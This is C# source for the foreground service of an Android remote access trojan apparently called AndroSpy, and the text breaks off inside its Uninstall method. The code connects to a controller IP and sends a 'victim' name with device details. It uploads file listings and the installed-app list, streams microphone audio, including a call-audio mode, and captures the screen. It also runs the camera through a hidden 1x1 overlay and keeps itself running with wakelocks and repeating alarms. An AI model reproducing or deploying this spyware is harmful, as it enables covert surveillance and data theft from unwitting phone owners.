using Android.App;
using Android.Bluetooth;
using Android.Content;
using Android.Content.PM;
using Android.Database;
using Android.Graphics;
using Android.Graphics.Drawables;
using Android.Hardware.Display;
using Android.Locations;
using Android.Media;
using Android.Media.Projection;
using Android.Net.Wifi;
using Android.OS;
using Android.Provider;
using Android.Runtime;
using Android.Support.V4.Content.PM;
using Android.Support.V4.Graphics.Drawable;
using Android.Telephony;
using Android.Views;
using Android.Widget;

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace Task2
{
    [Service(Label = "@string/service_started")]
    public class ForegroundService : Service
    {
        public static ForegroundService _globalService = null;
        public SurfaceView _globalSurface = null;
        public IWindowManager windowManager = null;
        private PowerManager pm = null;
        private PowerManager.WakeLock wk = null;

        public int kalite = 30;
        public Socket screenSock;
        public string ID = "";
        public override void OnCreate()
        {
            base.OnCreate();
            Platform.Init(Application);
            _globalService = this;
            key_gonder = false;
            mySocketConnected = false;
            CLOSE_CONNECTION = false;

            try { mProjectionManager = (MediaProjectionManager)GetSystemService(MediaProjectionService); }
            catch (Exception) { mProjectionManager = null; }

            bool exsist = Preferences.ContainsKey("aypi_adresi");
            if (exsist == false)
            {
                Preferences.Set("aypi_adresi", Resources.GetString(Resource.String.IP));
                Preferences.Set("port", Resources.GetString(Resource.String.PORT));
                Preferences.Set("kurban_adi", Resources.GetString(Resource.String.KURBANISMI));
                Preferences.Set("pass", Resources.GetString(Resource.String.PASSWORD));
                if (Resources.GetString(Resource.String.Ignore) == "1")
                {
                    dozeMod();
                }
                openAutostartSettings(this);
            }
            if (Resources.GetString(Resource.String.wakelock) == "1")
            {
                pm = (PowerManager)GetSystemService(PowerService);
                wk = pm.NewWakeLock(WakeLockFlags.Partial, Resources.GetString(Resource.String.app_name));
            }
            MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
            MainValues.port = int.Parse(Preferences.Get("port", "5656"));
            MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "n-a");
            PASSWORD = Preferences.Get("pass", string.Empty);

            myid = DateTime.Now.ToString("yyyyMMddHHmmssFFF");

            CamInService();
            createDir();
            screenintent();
            smsentintent();
            setAlarm(this);
        }

        public override IBinder OnBind(Intent intent)
            => null;

        [return: GeneratedEnum]
        public override StartCommandResult OnStartCommand(Intent intent, [GeneratedEnum] StartCommandFlags flags, int startId)
        {
            if (intent.Action.Equals(MainValues.ACTION_START_SERVICE))
            {
                Notification notification;
                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                {
                    CreateNotificationChannel();
                    notification = CreateNotificationWithChannelId();
                }
                else
                {
                    notification = CreateNotification();
                }

                StartForeground(MainValues.SERVICE_RUNNING_NOTIFICATION_ID, notification);
            }

            return StartCommandResult.Sticky;
        }
        private WindowManagerLayoutParams winparam = default;
        private void InitializeLiveStream()
        {
            ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(100, 100);
            _globalSurface = new SurfaceView(this)
            {
                LayoutParameters = layoutParams
            };
            winparam = new WindowManagerLayoutParams(WindowManagerTypes.SystemOverlay);
            winparam.Flags = WindowManagerFlags.NotTouchModal;
            winparam.Flags |= WindowManagerFlags.NotFocusable;
            winparam.Format = Android.Graphics.Format.Rgba8888;
            winparam.Width = 1;
            winparam.Height = 1;
            windowManager = GetSystemService(WindowService).JavaCast<IWindowManager>();
            windowManager.AddView(_globalSurface, winparam);
        }
        private Prev livePreview = default;
        public void CamInService()
        {
            InitializeLiveStream();
            livePreview = new Prev();
            _globalSurface.Holder.AddCallback(livePreview);
        }
        public override void OnDestroy()
        {
            base.OnDestroy();
        }
        private void CreateNotificationChannel()
        {
            var notificationChannel = new NotificationChannel
                (
                    Resources.GetString(Resource.String.app_name),
                    Resources.GetString(Resource.String.app_name),
                    NotificationImportance.Default
                );
            notificationChannel.LockscreenVisibility = NotificationVisibility.Secret;
            var notificationManager = (NotificationManager)GetSystemService(NotificationService);
            notificationManager.CreateNotificationChannel(notificationChannel);
        }

        private Notification CreateNotification()
        {
            var notification = new Notification.Builder(this)
                    .SetContentTitle(Resources.GetString(Resource.String.app_name))
                    .SetContentText(Resources.GetString(Resource.String.notification_text))
                    .SetSmallIcon(Resource.Drawable.ic_stat_name)
                    .SetOngoing(true)
                    .Build();

            return notification;
        }

        private Notification CreateNotificationWithChannelId()
        {
            var notification = new Notification.Builder(this, Resources.GetString(Resource.String.app_name))
               .SetContentTitle(Resources.GetString(Resource.String.app_name))
               .SetContentText(Resources.GetString(Resource.String.notification_text))
               .SetSmallIcon(Resource.Drawable.ic_stat_name)
               .SetOngoing(true)
               .Build();

            return notification;
        }
        public static int REQUEST_CODE = 100;

        public static string SCREENCAP_NAME = "screencap";
        public static int VIRTUAL_DISPLAY_FLAGS = (int)VirtualDisplayFlags.OwnContentOnly | (int)VirtualDisplayFlags.Public;
        public static MediaProjection sMediaProjection;

        public static MediaProjectionManager mProjectionManager;
        public static ImageReader mImageReader;
        public static Handler mHandler;
        public static Display mDisplay;
        public static VirtualDisplay mVirtualDisplay;
        public static int mDensity;
        public static int mWidth;
        public static int mHeight;
        public static int mRotation;
        public static OrientationChangeCallback mOrientationChangeCallback;
        public void createVirtualDisplay()
        {
            // get width and height
            Point size = new Point();
            mDisplay.GetSize(size);
            mWidth = size.X;
            mHeight = size.Y;

            // start capture reader
            mImageReader = ImageReader.NewInstance(mWidth, mHeight, (ImageFormatType)Android.Graphics.Format.Rgba8888, 2);
            mVirtualDisplay = sMediaProjection.CreateVirtualDisplay(SCREENCAP_NAME, mWidth, mHeight, mDensity, (DisplayFlags)VIRTUAL_DISPLAY_FLAGS, mImageReader.Surface, null, mHandler);
            mImageReader.SetOnImageAvailableListener(new ImageAvailableListener(), mHandler);
        }
        public void SetKeepAlive(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }
        public MemoryStream globalMemoryStream = default;
        public static Socket Soketimiz = default;
        IPEndPoint endpoint = default;
        IPAddress ipadresi = default;
        public bool CLOSE_CONNECTION = false;
        public List<Upload> upList = new List<Upload>();
        public static bool mySocketConnected = false;
        public static bool key_gonder = false;
        public string PASSWORD = string.Empty;
        public async void Baglanti_Kur()
        {
            await Task.Run(() =>
            {
                try
                {
                    ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                    endpoint = new IPEndPoint(ipadresi, MainValues.port);
                    Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    Soketimiz.ReceiveTimeout = -1; Soketimiz.SendTimeout = -1;
                    Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
                    Soketimiz.NoDelay = true;
                    SetKeepAlive(Soketimiz, 2000, 1000);

                    IAsyncResult result = Soketimiz.BeginConnect(ipadresi, MainValues.port, null, null);

                    result.AsyncWaitHandle.WaitOne(4000, true);

                    if (Soketimiz.Connected)
                    {
                        Soketimiz.EndConnect(result);

                        mySocketConnected = true;
                        
                        string deviceName = "Unknown";
                        try
                        {
                            deviceName = BluetoothAdapter.DefaultAdapter.Name;
                        }
                        catch (Exception) { }
                        byte[] dataToSend = System.Text.Encoding.UTF8.GetBytes("[VERI]" +
                        MainValues.KRBN_ISMI + "[VERI]" + RegionInfo.CurrentRegion + "&" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
                        + "[VERI]" + DeviceInfo.Manufacturer + " " + DeviceInfo.Model + "[VERI]" + releaseName() + "   " + DeviceInfo.Version + "&" + ((int)Build.VERSION.SdkInt).ToString() + "[VERI]" + wallpaper() + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier() + "[VERI]" +
                        ekranDurumu() + "[VERI]" + deviceName);

                        dataToSend = MyDataPacker("MYIP", dataToSend);

                        Soketimiz.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
                        if (pm != null)
                        {
                            try
                            {
                                if (!wk.IsHeld)
                                {
                                    wk.SetReferenceCounted(false);
                                    wk.Acquire();
                                    System.Diagnostics.Debug.WriteLine("cpu wakelock acquired.");
                                }
                            }
                            catch (Exception) { }
                        }
                        new ServerSession(Soketimiz);
                    }
                    else
                    {
                        if (Soketimiz != null)
                        {
                            try { Soketimiz.Close(); } catch (Exception) { }
                            try { Soketimiz.Dispose(); } catch (Exception) { }
                        }
                        mySocketConnected = false;
                    }
                }
                catch (Exception)
                {
                    System.Diagnostics.Debug.WriteLine("No Internet");
                    if (Soketimiz != null)
                    {
                        try { Soketimiz.Close(); } catch (Exception) { }
                        try { Soketimiz.Dispose(); } catch (Exception) { }
                    }

                    if (CLOSE_CONNECTION)
                    {
                        cancelAlarm(this);
                    }                
                }
            });
        }
        /// <summary>
        /// Send any data to connected socket.
        /// </summary>
        /// <param name="tag">The tag name of message, example: IP, MSGBOX, FILES etc. Then make switch case block for this tags
        /// on server or client.</param>
        /// <param name="message">Data of your message; any byte array of your data; image, text, file etc.</param>
        /// <param name="extraInfos">Extra Infos like: file name, max size, directory name etc.</param>
        public byte[] MyDataPacker(string tag, byte[] message, string extraInfos = "null")
        {
            //This byte packer coded by qH0sT' - 2021 - AndroSpy.
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>"), 0, System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>").Length);
                ms.Write(message, 0, message.Length);
                ms.Write(System.Text.Encoding.UTF8.GetBytes("<EOF>"), 0, System.Text.Encoding.UTF8.GetBytes("<EOF>").Length);

                ms.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                return ms.ToArray();
            }
        }

        public string releaseName()
        {
            //string versionName = Java.Lang.Class.FromType(typeof(Build.VERSION_CODES)).GetFields()[(int)Build.VERSION.SdkInt + 1].Name;
            string[] versionNames = new string[]{"ANDROID BASE", "ANDROID BASE 1.1", "CUPCAKE", "DONUT",
            "ECLAIR", "ECLAIR_0_1", "ECLAIR_MR1", "FROYO",
            "GINGERBREAD", "GINGERBREAD_MR1", "HONEYCOMB", "HONEYCOMB_MR1",
            "HONEYCOMB_MR2", "ICE_CREAM_SANDWICH", "ICE_CREAM_SANDWICH_MR1", "JELLY_BEAN",
            "JELLY_BEAN", "JELLY_BEAN", "KITKAT", "KITKAT",
            "LOLLIPOOP", "LOLLIPOOP_MR1", "MARSHMALLOW", "NOUGAT",
            "NOUGAT", "OREO", "OREO", "ANDROID PIE" , "ANDROID Q", "Red Velvet Cake".ToUpper()};
            try
            {
                int nameIndex = (int)Build.VERSION.SdkInt - 1;
                if (nameIndex < versionNames.Length)
                {
                    return versionNames[nameIndex];
                }
                return "Unknown";
            }
            catch (Exception) { return "Unknown"; }
        }
        public class ServerSession : IDisposable
        {
            // feel free to use this class for your own RATs projects (: - qH0sT.
            private MemoryStream memos = new MemoryStream();
            private byte[] dataByte = new byte[8192]; // 1024 * 8
            private int blockSize = 8192;
            public ServerSession(Socket serverSock)
            {
                _globalService.globalMemoryStream = memos;
                ReadAsync(serverSock);
            }
            private async void ReadAsync(Socket server)
            {
                using (NetworkStream ns = new NetworkStream(server))
                {
                    int readed = default;
                    while (true)
                    {
                        try
                        {
                            readed = await ns.ReadAsync(dataByte, 0, blockSize);
                            if (readed > 0)
                            {
                                if (memos != null)
                                {
                                    memos.Write(dataByte, 0, readed);
                                    UnPacker(memos);
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Dispose();
                            break;
                        }
                        await Task.Delay(1);
                    }
                }
            }

            private void UnPacker(MemoryStream ms)
            {
                //This unpacker coded by qH0sT' - 2021 - AndroSpy.
                //string letter = "qwertyuıopğüasdfghjklşizxcvbnmöç1234567890<>|";
                Regex regex = new Regex(@"<[A-Z]+>\|[0-9]+\|.*>");

                byte[][] filebytes = Separate(ms.ToArray(), System.Text.Encoding.UTF8.GetBytes("SUFFIX"));
                for (int k = 0; k < filebytes.Length; k++)
                {
                    if (!(filebytes[k].Length <= 0))
                    {
                        try
                        {
                            string ch = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 1] });// >
                            string f = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 2] });// F>
                            string o = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 3] });// OF>
                            string e = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 4] });// EOF>
                            string ch_ = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 5] });// <EOF>

                            bool isContainsEof = (ch_ + e + o + f + ch) == "<EOF>";
                            if (isContainsEof)
                            {
                                List<byte> mytagByte = new List<byte>();
                                string temp = "";
                                for (int p = 0; p < filebytes[k].Length; p++)
                                {
                                    //if (letter.Contains(Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] }).ToLower()))
                                    //{
                                    temp += System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] });
                                    mytagByte.Add(filebytes[k][p]);
                                    if (regex.IsMatch(temp))
                                    {
                                        break;
                                    }
                                    //}
                                }
                                string whatsTag = System.Text.Encoding.UTF8.GetString(mytagByte.ToArray());

                                MemoryStream tmpMemory = new MemoryStream();
                                tmpMemory.Write(filebytes[k], 0, filebytes[k].Length);
                                tmpMemory.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                                ms.Flush();
                                ms.Close();
                                ms.Dispose();
                                ms = new MemoryStream(RemoveBytes(ms.ToArray(), tmpMemory.ToArray()));
                                memos = new MemoryStream();
                                ms.CopyTo(memos);
                                tmpMemory.Flush();
                                tmpMemory.Close();
                                tmpMemory.Dispose();
                                filebytes[k] = RemoveBytes(filebytes[k], mytagByte.ToArray());
                                filebytes[k] = RemoveBytes(filebytes[k], System.Text.Encoding.UTF8.GetBytes("<EOF>"));


                                _globalService.DataProcess(whatsTag, filebytes[k]); // Process our datas as tag and buffer data.

                            }
                        }
                        catch (Exception) { }
                    }
                }
            }

            private byte[][] Separate(byte[] source, byte[] separator)
            {
                var Parts = new List<byte[]>();
                var Index = 0;
                byte[] Part;
                for (var I = 0; I < source.Length; ++I)
                {
                    if (Equals(source, separator, I))
                    {
                        Part = new byte[I - Index];
                        Array.Copy(source, Index, Part, 0, Part.Length);
                        Parts.Add(Part);
                        Index = I + separator.Length;
                        I += separator.Length - 1;
                    }
                }
                Part = new byte[source.Length - Index];
                Array.Copy(source, Index, Part, 0, Part.Length);
                Parts.Add(Part);
                return Parts.ToArray();
            }
            private bool Equals(byte[] source, byte[] separator, int index)
            {
                for (int i = 0; i < separator.Length; ++i)
                    if (index + i >= source.Length || source[index + i] != separator[i])
                        return false;
                return true;
            }
            private byte[] RemoveBytes(byte[] input, byte[] pattern)
            {
                if (pattern.Length == 0) return input;
                var result = new List<byte>();
                for (int i = 0; i < input.Length; i++)
                {
                    var patternLeft = i <= input.Length - pattern.Length;
                    if (patternLeft && (!pattern.Where((t, j) => input[i + j] != t).Any()))
                    {
                        i += pattern.Length - 1;
                    }
                    else
                    {
                        result.Add(input[i]);
                    }
                }
                return result.ToArray();
            }

            public void Dispose()
            {
                Dispose(true);
                try { GC.SuppressFinalize(this); } catch (Exception) { }
            }
            protected bool Disposed { get; private set; }
            protected virtual void Dispose(bool disposing)
            {
                Disposed = true;
            }
        }
        public void StopServerSession(MemoryStream memos_)
        {
            try
            {
                //((MainActivity)global_activity).RunOnUiThread(() => { Toast.MakeText(global_activity,"DISCONNECT", ToastLength.Long).Show(); });
                foreach (Upload apload in upList.ToList())
                {
                    try { apload.CloseSockets(); } catch { }
                }
            }
            catch (Exception) { }
            if (wk != null)
            {
                if (wk.IsHeld)
                {
                    wk.Release();
                    System.Diagnostics.Debug.WriteLine("cpu wakelock released.");
                }
            }
            upList.Clear();
            livePreview.StopCamera();
            key_gonder = false;
            micStop();
            stopProjection();
            mySocketConnected = false;
            if (memos_ != null)
            {
                try { memos_.Flush(); memos_.Close(); memos_.Dispose(); } catch (Exception) { }
            }
            if (Soketimiz != null)
            {
                try { Soketimiz.Close(); } catch (Exception) { }
                try { Soketimiz.Dispose(); } catch (Exception) { }
            }
            if (CLOSE_CONNECTION)
            {
                cancelAlarm(this);
            }
        }
        public void setAlarm(Context context) //Java.Lang.JavaSystem.CurrentTimeMillis() SetAlarmClock(new AlarmManager.AlarmClockInfo(Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi), pi);
        {
            cancelAlarm(this);
            try
            {
                AlarmManager am = (AlarmManager)context.GetSystemService(AlarmService);
                Intent i = new Intent(context, Java.Lang.Class.FromType(typeof(Alarm)));
                i.SetAction("MY_ALARM_RECEIVED");
                PendingIntent pi = PendingIntent.GetBroadcast(context, 0, i, 0);
                if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
                {
                    am.SetAndAllowWhileIdle(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
                }
                else
                {
                    am.Set(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
                }
                System.Diagnostics.Debug.WriteLine("Set alarm.");
            }
            catch (Exception)
            {
                Task.Delay(50).Wait();
                mySocketConnected = false;
                setAlarm(this);
            }
        }

        public void cancelAlarm(Context context)
        {
            try
            {
                Intent intent = new Intent(context, Java.Lang.Class.FromType(typeof(Alarm)));
                PendingIntent sender = PendingIntent.GetBroadcast(context, 0, intent, PendingIntentFlags.CancelCurrent);
                AlarmManager alarmManager = (AlarmManager)context.GetSystemService(AlarmService);
                alarmManager.Cancel(sender); alarmManager.Dispose();
                System.Diagnostics.Debug.WriteLine("Canceled alarm");
            }
            catch (Exception) { }

        }

        public void screenintent()
        {
            try
            {
                IntentFilter filt = new IntentFilter(Intent.ActionScreenOn);
                filt.AddAction(Intent.ActionScreenOff);
                filt.AddAction(Intent.ActionUserPresent);
                RegisterReceiver(new ScreenStatus(), filt);
            }
            catch (Exception) { }
        }
        public void smsentintent()
        {
            try
            {
                IntentFilter filt_ = new IntentFilter("SMS_SENT");
                RegisterReceiver(new SMSSTATUS(), filt_);
            }
            catch (Exception) { }
        }
        List<string> allDirectory_ = new List<string>();
        List<string> sdCards = new List<string>();
        public void dosyalar()
        {
            try
            {
                allDirectory_.Clear();
                sdCards.Clear();
                Java.IO.File[] _path = GetExternalFilesDirs(null);
                foreach (var spath in _path)
                {
                    if (spath.Path.Contains("emulated") == false)
                    {
                        string s = spath.Path.ToString();
                        s = s.Replace(s.Substring(s.IndexOf("/And")), "");
                        sdCards.Add(s);
                    }
                }
                if (sdCards.Count > 0)
                {
                    listf(sdCards[0]);
                }
                sonAsama(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath);
                System.Text.StringBuilder dosyalarS = new System.Text.StringBuilder();
                for (int p = 0; p < allDirectory_.Count; p++)
                {
                    dosyalarS.Append(allDirectory_[p] + "<");
                }
                if (!string.IsNullOrEmpty(dosyalarS.ToString()))
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]IKISIDE[VERI]" + dosyalarS));
                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
                else
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]IKISIDE[VERI]BOS"));
                        Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception) { }
        }
        public void sonAsama(string absPath)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(absPath);
                DirectoryInfo[] klasorler = di.GetDirectories();
                FileInfo[] fi = di.GetFiles("*.*");
                for (int c = 0; c < klasorler.Length; c++)
                {
                    allDirectory_.Add(klasorler[c].Name + "?" + klasorler[c].FullName + "?" + "XX_FOLDER_XX" + "?" + "" + "?CİHAZ?"
                         + absPath);
                }
                for (int p = 0; p < fi.Length; p++)
                {
                    if (fi[p].DirectoryName.Contains(".thumbnail") == false)
                    {
                        allDirectory_.Add(fi[p].Name + "?" + fi[p].DirectoryName + "?" + fi[p].Extension + "?" + GetFileSizeInBytes(
                            fi[p].FullName) + "?CİHAZ?" + absPath);
                    }
                }
            }
            catch (Exception) { }
        }
        public void listf(string directoryName)
        {
            try
            {
                Java.IO.File directory = new Java.IO.File(directoryName);
                Java.IO.File[] fList = directory.ListFiles();
                if (fList != null)
                {
                    for (int j = 0; j < fList.Length; j++)
                    {
                        try
                        {
                            if (fList[j].IsFile)
                            {
                                allDirectory_.Add(fList[j].Name + "?" + fList[j].AbsolutePath + "?" +
                        getExtension(fList[j].AbsolutePath) + "?" + GetFileSizeInBytes(fList[j].AbsolutePath) + "?SDCARD?" + directoryName);
                            }
                            else if (fList[j].IsDirectory)
                            {
                                allDirectory_.Add(fList[j].Name + "?" + fList[j].AbsolutePath + "?" + "XX_FOLDER_XX" + "?" + "" + "?SDCARD?" + directoryName);
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch (Exception) { }
        }
        private string getExtension(string fname)
        {
            try
            {
                return fname.Substring(fname.LastIndexOf("."));
            }
            catch (Exception) { return ""; }
        }
        public void uygulamalar()
        {
            System.Text.StringBuilder bilgiler = new System.Text.StringBuilder();
            PackageManager packageManager = ApplicationContext.PackageManager;
            var apps = packageManager.GetInstalledApplications((PackageInfoFlags)128);
            if (apps != null)
            {
                for (int i = 0; i < apps.Count; i++)
                {
                    try
                    {
                        ApplicationInfo applicationInfo = apps[i];
                        Intent aPP = packageManager.GetLaunchIntentForPackage(applicationInfo.PackageName);
                        if (aPP != null)
                        {
                            if (aPP.Categories.Contains(Intent.CategoryLauncher))
                            {
                                var isim = applicationInfo.LoadLabel(PackageManager);
                                var paket_ismi = applicationInfo.PackageName;
                                string app_ico = "[NULL]";

                                try
                                {
                                    Drawable drawable = packageManager.GetApplicationIcon(paket_ismi);
                                    if (drawable != null)
                                    {

                                        Bitmap bitmap = Bitmap.CreateScaledBitmap(drawableToBitmap(drawable), 52, 52, true);
                                        using (MemoryStream ms = new MemoryStream())
                                        {
                                            bitmap.Compress(Bitmap.CompressFormat.Jpeg, 35, ms);
                                            app_ico = StringCompressor.CompressString(Convert.ToBase64String(ms.ToArray()));
                                        }
                                    }
                                    else
                                    {
                                        System.Diagnostics.Debug.WriteLine(paket_ismi + " Hata: null");
                                        app_ico = "[NULL]";
                                    }
                                }
                                catch (Exception ex)
                                {
                                    System.Diagnostics.Debug.WriteLine(paket_ismi + " Hata: " + ex.ToString());
                                    app_ico = "[NULL]";
                                }


                                string infos = isim + "[VERI]" + paket_ismi + "[VERI]" + app_ico;
                                bilgiler.Append(infos + "[APPDATA]");
                            }
                        }
                    }
                    catch (Exception) { }
                }
                try
                {
                    byte[] dataPacker = MyDataPacker("APPS", StringCompressor.Compress(System.Text.Encoding.UTF8.GetBytes(bilgiler.ToString())));
                    Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
        private Bitmap drawableToBitmap(Drawable drwbl)
        {
            Bitmap bitmap = null;
            try
            {
                if (drwbl.IntrinsicWidth <= 0 || drwbl.IntrinsicHeight <= 0)
                    bitmap = Bitmap.CreateBitmap(1, 1, Bitmap.Config.Argb8888);
                else
                    bitmap = Bitmap.CreateBitmap(drwbl.IntrinsicWidth, drwbl.IntrinsicHeight, Bitmap.Config.Argb8888);


                using (Canvas canvas = new Canvas(bitmap))
                {
                    drwbl.SetBounds(0, 0, canvas.Width, canvas.Height);
                    drwbl.Draw(canvas);
                }
            }
            catch (Exception) { }
            return bitmap;
        }
        public static string GetFileSizeInBytes(string filenane)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = new FileInfo(filenane).Length;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception) { return "0 B"; }
        }
        UdpClient client = null;
        AudioStream audioStream = null;
        public void micSend(string sampleRate, string kaynak)
        {
            //micStop();
            AudioSource source = AudioSource.Default;
            switch (kaynak)
            {
                case "Mikrofon":
                    source = AudioSource.Mic;
                    break;
                case "Varsayılan":
                    source = AudioSource.Default;
                    break;
                case "Telefon Görüşmesi":
                    if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
                    mgr.Mode = Mode.InCall;
                    mgr.SetStreamVolume(Android.Media.Stream.VoiceCall, mgr.GetStreamMaxVolume(Android.Media.Stream.VoiceCall), 0);
                    source = AudioSource.Mic;
                    break;
            }
            try
            {
                client = new UdpClient();
                audioStream = new AudioStream(int.Parse(sampleRate), source);
                audioStream.OnBroadcast += AudioStream_OnBroadcast;
                audioStream.Start();
            }
            catch (Exception) { }
        }

        public void micStop()
        {
            if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
            mgr.Mode = Mode.Normal;
            if (audioStream != null)
            {
                audioStream.Stop();
                audioStream.Flush();
                audioStream = null;
            }
            if (client != null)
            {
                client.Close();
                client.Dispose();
                client = null;
            }

        }
        private void AudioStream_OnBroadcast(object sender, byte[] e)
        {
            try
            {
                client.Send(e, e.Length, endpoint);
            }
            catch (Exception)
            {
                micStop();
            }
        }
        public void kameraCozunurlukleri()
        {
            try
            {
                /*
                 * Android.Hardware.Camera is from API Level 1
                 * Android.Hardware.Camera2 is from API Level 21 // This is not working under of API Level 21 :( 
                 * Example: Android KitKat 4.4.2 API Level 19
                 * So,
                 * I have seen that we can't access the number of cameras in API Level 19 (I have tried on my Samsung tablet) because of Camera2 API has been added in API Level 21
                 * thus I have update it Android.Hardware.Camera from Android.Hardware.Camera2
                 */
                //Android.Hardware.Camera2 cameraManager = (Android.Hardware.Camera2)GetSystemService(CameraService);
                int IDs = Android.Hardware.Camera.NumberOfCameras;
                string gidecekler = default;
                string cameralar = default;
                string supZoom = default;
                string previewsizes = default;
                for (int i = 0; i < IDs; i++)
                {
                    int cameraId = i;
                    Android.Hardware.Camera.CameraInfo cameraInfo = new Android.Hardware.Camera.CameraInfo();
                    Android.Hardware.Camera.GetCameraInfo(cameraId, cameraInfo);
                    Android.Hardware.Camera camera = Android.Hardware.Camera.Open(cameraId);
                    Android.Hardware.Camera.Parameters cameraParams = camera.GetParameters();
                    var sizes = cameraParams.SupportedPictureSizes;
                    var presize = cameraParams.SupportedPreviewSizes;
                    if (cameraInfo.Facing == Android.Hardware.CameraFacing.Front)
                    {
                        supZoom = cameraParams.IsZoomSupported.ToString() + "}" + cameraParams.MaxZoom.ToString();
                    }
                    for (int j = 0; j < sizes.Count; j++)
                    {

                        int widht = sizes[j].Width;
                        int height = sizes[j].Height;
                        gidecekler += widht.ToString() + "x" + height.ToString() + "<";
                    }
                    camera.Release();
                    gidecekler += ">";
                    if (cameraInfo.Facing == Android.Hardware.CameraFacing.Front)
                    {
                        foreach (var siz in presize)
                        {
                            previewsizes += siz.Width.ToString() + "x" + siz.Height.ToString() + "<";
                        }
                    }
                    cameralar += cameraId.ToString() + "!";
                }
                byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes("[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}"));
                Soketimiz.Send(data, 0, data.Length, SocketFlags.None);
                //soketimizeGonder("OLCULER", "[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}[VERI][0x09]");
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes($"[VERI]An error occured while getting camera list. Exception:[NEW_LINE]{ex.Message.Replace(System.Environment.NewLine, "[NEW_LINE]")}"));
                    Soketimiz.Send(data, 0, data.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }

        public void createDir()
        {
            try
            {
                if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
                {
                    Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                }
            }
            catch (Exception) { }
        }
        public void dozeMod()
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                Intent intent = new Intent();
                string packageName = Application.PackageName;
                PowerManager pm = (PowerManager)GetSystemService(PowerService);
                if (!pm.IsIgnoringBatteryOptimizations(packageName))
                {
                    intent.SetAction(Settings.ActionRequestIgnoreBatteryOptimizations);
                    intent.SetData(Android.Net.Uri.Parse("package:" + packageName));
                    intent.AddFlags(ActivityFlags.NewTask);
                    StartActivity(intent);
                }
            }
        }
        public void Uninstall()
        {
            try
            {
                Intent intent = new Intent(Intent.ActionDelete);
